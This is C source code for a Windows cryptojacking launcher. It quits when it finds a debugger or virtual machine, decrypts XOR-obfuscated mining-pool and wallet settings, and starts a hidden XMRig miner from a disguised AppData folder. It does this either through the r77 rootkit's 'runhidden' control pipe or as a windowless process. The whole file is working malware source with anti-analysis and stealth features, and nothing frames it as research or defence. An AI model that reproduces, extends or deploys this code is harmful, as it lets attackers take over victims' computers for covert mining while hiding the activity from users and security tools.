#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <shlobj.h>
#include <intrin.h>

#define XOR_KEY (0xAA ^ 0x57)  // 0xFD

// Encrypted configuration strings (without trailing XOR_KEY)
BYTE encryptedPool[] = { 
    0xFD, 0xFA, 0xF3, 0xFC, 0xD3, 0xF6, 0xF3, 0xF3, 0xF1, 0xF4, 0xFB, 0xF3, 
    0xFC, 0xFD, 0xF4, 0xFA, 0xFD, 0xE6, 0xE3, 0xE3, 0xE0, 0xE3, 0xE3
};

BYTE encryptedWallet[] = { 
    0x1B, 0x1F, 0x1A, 0x18, 0x4B, 0x1A, 0x1E, 0x18, 0x1F, 0x4B, 0x1F, 0x1C, 
    0x1D, 0x4B, 0x1E, 0x1D, 0x1C, 0x1F, 0x1A, 0x4B, 0x1F, 0x1A, 0x1E, 0x1D, 
    0x1F, 0x1A, 0x1C, 0x4B, 0x18, 0x1F, 0x1A, 0x1D, 0x1C, 0x1F, 0x1A, 0x1E, 
    0x1D, 0x1F, 0x1A, 0x1C, 0x4B, 0x1C, 0x1D, 0x18, 0x1F, 0x4B, 0x1C, 0x1D, 
    0x1A, 0x1B, 0x4B, 0x1F, 0x18, 0x1B, 0x1A, 0x1F, 0x18, 0x1C, 0x1D, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 
    0x1A, 0x1B, 0x1F, 0x18, 0x1C, 0x1F, 0x1A, 0x1B, 0x1F, 0x18, 0x1C
};

BYTE encryptedWorker[] = { 
    0xF0, 0xF7, 0xFA, 0xF3, 0xF6, 0xF1, 0xA3, 0xE0, 0xE7
};

BYTE encryptedParams[] = { 
    0x9D, 0x98, 0x9B, 0x9A, 0x98, 0x8F, 0xDE, 0x9D, 0x96, 0x97, 0x98, 0x8F, 
    0xDF, 0xDA, 0xDB, 0xDE, 0x8F, 0xDA, 0x9C, 0x9B
};

// Anti-analysis macros
#if defined(_MSC_VER) && defined(_M_IX86)
    #define JUNK_BLOCK __asm { __emit 0x90; __emit 0x90 }
#else
    #define JUNK_BLOCK
#endif

// Function prototypes
char* DECRYPT(BYTE* data, size_t len);
BOOL IsDebugged();
BOOL IsVM();
BOOL FileExists(LPCSTR path);
char* EscapeArgument(LPCSTR arg);
BOOL RunHiddenProcess(LPCSTR path, LPCSTR params);
BOOL RunViaR77Pipe(LPCSTR minerPath, LPCSTR params);
BOOL IsConfigValid(LPCSTR configPath);

// String decryption with proper null termination
char* DECRYPT(BYTE* data, size_t len) {
    char* decrypted = (char*)malloc(len + 1);
    if (!decrypted) return NULL;
    
    for (size_t i = 0; i < len; i++) {
        decrypted[i] = data[i] ^ XOR_KEY;
        JUNK_BLOCK;
    }
    decrypted[len] = '\0';
    return decrypted;
}

// Enhanced anti-debugging
BOOL IsDebugged() {
    JUNK_BLOCK;
    BOOL debugged = FALSE;
    
    // Basic debugger check
    if (IsDebuggerPresent()) 
        return TRUE;
    
    // Advanced checks
    typedef BOOL (WINAPI *PCHKREMOTEDEBUG)(HANDLE, PBOOL);
    PCHKREMOTEDEBUG CheckRemoteDebuggerPresent = 
        (PCHKREMOTEDEBUG)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CheckRemoteDebuggerPresent");
    
    if (CheckRemoteDebuggerPresent) {
        BOOL remoteDebugged = FALSE;
        if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugged) && remoteDebugged)
            return TRUE;
    }
    
    // Timing-based check
    DWORD start = GetTickCount();
    Sleep(100);
    if ((GetTickCount() - start) < 90)  // Should take ~100ms
        return TRUE;
    
    return debugged;
}

// Enhanced VM detection
BOOL IsVM() {
    JUNK_BLOCK;
    BOOL result = FALSE;
    
    // Check CPUID hypervisor bit
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31))  // Bit 31 of ECX indicates hypervisor
        return TRUE;
    
    // Check for common VM artifacts
    if (GetModuleHandleA("vboxservice.dll") || 
        GetModuleHandleA("vm3dgl.dll") || 
        GetModuleHandleA("vmtools.dll") ||
        GetModuleHandleA("vmmouse.sys")) {
        return TRUE;
    }
    
    // Check for VM-specific registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }
    
    // Check CPU core count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2)
        return TRUE;
    
    return result;
}

// File existence check
BOOL FileExists(LPCSTR path) {
    DWORD attrib = GetFileAttributesA(path);
    return (attrib != INVALID_FILE_ATTRIBUTES && 
            !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Escape command-line arguments
char* EscapeArgument(LPCSTR arg) {
    if (!arg) return NULL;
    
    // Calculate required buffer size
    size_t len = strlen(arg);
    size_t escapedLen = len + 2;  // For quotes
    BOOL needsQuotes = FALSE;
    
    for (size_t i = 0; i < len; i++) {
        if (arg[i] == '"' || arg[i] == '\\' || arg[i] == ' ' || arg[i] == '\t') {
            needsQuotes = TRUE;
            escapedLen++;  // For escaping special characters
        }
    }
    
    if (!needsQuotes) {
        char* simpleCopy = (char*)malloc(len + 1);
        if (simpleCopy) strcpy_s(simpleCopy, len + 1, arg);
        return simpleCopy;
    }
    
    // Allocate and build escaped string
    char* escaped = (char*)malloc(escapedLen + 1);
    if (!escaped) return NULL;
    
    char* ptr = escaped;
    *ptr++ = '"';
    
    for (size_t i = 0; i < len; i++) {
        if (arg[i] == '"' || arg[i] == '\\') {
            *ptr++ = '\\';  // Escape character
        }
        *ptr++ = arg[i];
    }
    
    *ptr++ = '"';
    *ptr = '\0';
    
    return escaped;
}

// Enhanced config validation
BOOL IsConfigValid(LPCSTR configPath) {
    HANDLE hFile = CreateFileA(configPath, GENERIC_READ, FILE_SHARE_READ, 
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
        return FALSE;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size < 1024 || size > 102400) {  // 1KB-100KB range
        CloseHandle(hFile);
        return FALSE;
    }

    // Read file content
    char* buffer = (char*)malloc(size + 1);
    if (!buffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    BOOL success = ReadFile(hFile, buffer, size, &bytesRead, NULL);
    CloseHandle(hFile);

    if (!success || bytesRead != size) {
        free(buffer);
        return FALSE;
    }
    buffer[size] = '\0';

    // Check for required JSON keys
    BOOL valid = strstr(buffer, "\"pool\"") && 
                 strstr(buffer, "\"wallet\"") && 
                 strstr(buffer, "\"password\"");

    free(buffer);
    return valid;
}

// Process execution with dynamic buffer
BOOL RunHiddenProcess(LPCSTR path, LPCSTR params) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Calculate required buffer size
    size_t pathLen = strlen(path);
    size_t paramsLen = params ? strlen(params) : 0;
    size_t totalLen = pathLen + paramsLen + 32;  // Space for quotes and spacing
    
    // Allocate command line buffer
    char* cmdLine = (char*)malloc(totalLen);
    if (!cmdLine) return FALSE;
    
    // Build command line
    if (params) {
        snprintf(cmdLine, totalLen, "\"%s\" %s", path, params);
    } else {
        snprintf(cmdLine, totalLen, "\"%s\"", path);
    }
    
    BOOL success = CreateProcessA(
        NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    
    free(cmdLine);
    
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

// Execute via r77 rootkit control pipe with handle cleanup
BOOL RunViaR77Pipe(LPCSTR minerPath, LPCSTR params) {
    HANDLE hPipe = CreateFileA(
        "\\\\.\\pipe\\$77control",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE) 
        return FALSE;

    // Calculate required command size
    size_t pathLen = strlen(minerPath);
    size_t paramsLen = params ? strlen(params) : 0;
    size_t commandLen = 32 + pathLen + paramsLen;  // "runhidden \"\" " + params
    
    // Allocate command buffer
    char* command = (char*)malloc(commandLen);
    if (!command) {
        CloseHandle(hPipe);
        return FALSE;
    }
    
    // Build command
    if (params) {
        snprintf(command, commandLen, "runhidden \"%s\" %s", minerPath, params);
    } else {
        snprintf(command, commandLen, "runhidden \"%s\"", minerPath);
    }
    
    DWORD bytesWritten;
    BOOL success = WriteFile(hPipe, command, (DWORD)strlen(command), &bytesWritten, NULL);
    
    free(command);
    CloseHandle(hPipe);
    
    return success;
}

// Main function with improved error handling
int main() {
    // Anti-analysis checks
    if (IsDebugged() || IsVM()) 
        return 1;

    // Get AppData path
    CHAR appDataPath[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return 1;
    }
    
    // Build paths
    CHAR mallDir[MAX_PATH] = {0};
    snprintf(mallDir, MAX_PATH, "%s\\Microsoft\\Windows\\Templates\\$77-mall", appDataPath);
    
    CHAR minerPath[MAX_PATH] = {0};
    snprintf(minerPath, MAX_PATH, "%s\\$77-xmrig.exe", mallDir);
    
    CHAR configPath[MAX_PATH] = {0};
    snprintf(configPath, MAX_PATH, "%s\\config.json", mallDir);
    
    // Verify miner exists
    if (!FileExists(minerPath)) 
        return 2;
    
    // Execution strategy
    BOOL success = FALSE;
    
    // Priority 1: Use config.json if valid
    if (FileExists(configPath) && IsConfigValid(configPath)) {
        success = RunViaR77Pipe(minerPath, NULL);
        if (!success) {
            success = RunHiddenProcess(minerPath, NULL);
        }
    }

    // Priority 2: Use encrypted parameters if config fails
    if (!success) {
        // Decrypt configuration
        char* pool = DECRYPT(encryptedPool, sizeof(encryptedPool));
        char* wallet = DECRYPT(encryptedWallet, sizeof(encryptedWallet));
        char* worker = DECRYPT(encryptedWorker, sizeof(encryptedWorker));
        char* params = DECRYPT(encryptedParams, sizeof(encryptedParams));
        
        if (pool && wallet && worker && params) {
            // Escape arguments
            char* escapedPool = EscapeArgument(pool);
            char* escapedWallet = EscapeArgument(wallet);
            char* escapedWorker = EscapeArgument(worker);
            
            // Build parameter string
            size_t paramLen = 128; // Base length
            if (escapedPool) paramLen += strlen(escapedPool);
            if (escapedWallet) paramLen += strlen(escapedWallet);
            if (escapedWorker) paramLen += strlen(escapedWorker);
            if (params) paramLen += strlen(params);
            
            char* minerParams = (char*)malloc(paramLen);
            if (minerParams) {
                minerParams[0] = '\0';
                if (escapedPool && escapedWallet && escapedWorker) {
                    snprintf(
                        minerParams, paramLen,
                        "-o %s -u %s -p %s %s",
                        escapedPool,
                        escapedWallet,
                        escapedWorker,
                        params
                    );
                }
                
                // Execute with parameters
                success = RunViaR77Pipe(minerPath, minerParams);
                if (!success) {
                    success = RunHiddenProcess(minerPath, minerParams);
                }
                
                // Cleanup minerParams buffer
                if (minerParams) {
                    SecureZeroMemory(minerParams, paramLen);
                    free(minerParams);
                }
            }
            
            // Cleanup escaped arguments
            if (escapedPool) {
                SecureZeroMemory(escapedPool, strlen(escapedPool));
                free(escapedPool);
            }
            if (escapedWallet) {
                SecureZeroMemory(escapedWallet, strlen(escapedWallet));
                free(escapedWallet);
            }
            if (escapedWorker) {
                SecureZeroMemory(escapedWorker, strlen(escapedWorker));
                free(escapedWorker);
            }
        }
        
        // Clean sensitive data from decrypted buffers
        if (pool) {
            size_t poolLen = strlen(pool);
            SecureZeroMemory(pool, poolLen);
            free(pool);
        }
        if (wallet) {
            size_t walletLen = strlen(wallet);
            SecureZeroMemory(wallet, walletLen);
            free(wallet);
        }
        if (worker) {
            size_t workerLen = strlen(worker);
            SecureZeroMemory(worker, workerLen);
            free(worker);
        }
        if (params) {
            size_t paramsLen = strlen(params);
            SecureZeroMemory(params, paramsLen);
            free(params);
        }
        
        // Clean original encrypted buffers
        SecureZeroMemory(encryptedPool, sizeof(encryptedPool));
        SecureZeroMemory(encryptedWallet, sizeof(encryptedWallet));
        SecureZeroMemory(encryptedWorker, sizeof(encryptedWorker));
        SecureZeroMemory(encryptedParams, sizeof(encryptedParams));
    }
    
    return success ? 0 : 3;
}